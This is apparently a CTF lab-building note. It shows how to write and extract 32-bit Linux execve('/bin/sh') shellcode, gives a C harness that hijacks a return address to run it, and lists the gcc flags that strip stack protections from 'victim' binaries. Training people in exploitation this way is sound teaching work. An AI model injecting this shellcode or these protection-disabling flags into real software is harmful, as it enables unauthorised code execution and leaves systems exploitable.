# Writing 32bit shellcode for 64bit Linux
This has been the most time consuming part of building this CTF. Writing
shellcode is out-of-scope for this training, but there is value in learning to
inject shellcode.

## Call execve with C using in-line ASM
I'm skipping some steps here for brevity, but by compiling and dissasembling a
simple C program calling `execve()`, the instructions and machine code can be
studied. Below is some pre-written ASM to write

```
main () {
__asm__(
    "       jmp mcall           \n\t" // jump trick to load "/bin/sh" string
    "ajmp:  pop %ebx            \n\t" // pop "/bin/sh" into ebx
    "       xor %eax, %eax      \n\t" // NULL out eax
    "       mov %al,0x7(%ebx)   \n\t" // NULL terminate "/bin/sh" string
    "       mov %ebx,0x8(%ebx)  \n\t" // set next 4 bytes to "/bin/sh" address
    "       mov %eax,0xc(%ebx)  \n\t" // set next 4 bytes to NULL
    "       mov $0xb,%al        \n\t" // set eax to syscall 11, execve
    "       lea 0x8(%ebx),%ecx  \n\t" // load str address into ecx
    "       lea 0xc(%ebx),%edx  \n\t" // load NULL into edx
    "       int $0x80           \n\t" // call execve syscall
    "mcall: call ajmp           \n\t"
    "       .string \"/bin/sh\""
);
}
```

This is compiled with `gcc -static` to include the execve() library in the
compiled program.

## Extracting shellcode from compiled program
Running `objdump -d [binary.exe] | grep -A40 main.: | less` should isolate the
machine instructions that we are looking for. Specifically, the shellcode we
need starts with `jmp mcall` and ends with `call ajmp`.

This is the shellcode I compiled on my machine:

```
\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c
\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff
\xff/bin/sh/XAAAABBBB
```
The trailing string is necessary so the memory we need to assign (address and
NULL bytes) will be allocated.

## Testing shellcode
This program is the simplest way I've found to test shellcode:
```
/* Define shellcode array */
char sc[] =
    "\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c"
    "\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff"
    "\xff/bin/sh/XAAAABBBB";

main() {
    /* Pointer for return address */
    int *ret;

    /* Add 2 * 4bytes (size of int) to ret, so it points at main's return addr */
    ret = (int *)&ret+2;

    /* Overwrite the value of ret (main's ret addr) with a pointer sc array */
    *ret = (int)sc;
}

```

The following gcc flags are used when compiling 'victim' binaries to enable
basic exploits, and reduce complexity for students:
- `-m32`, compile as 32bit to shorten addresses
- `-mpreferred-stack-boundary=2`, align stack frames on 4-byte boundaries
- `-fno-stack-protector`, remove the stack canary
- `-z execstack`, disable no-execute bit on stack
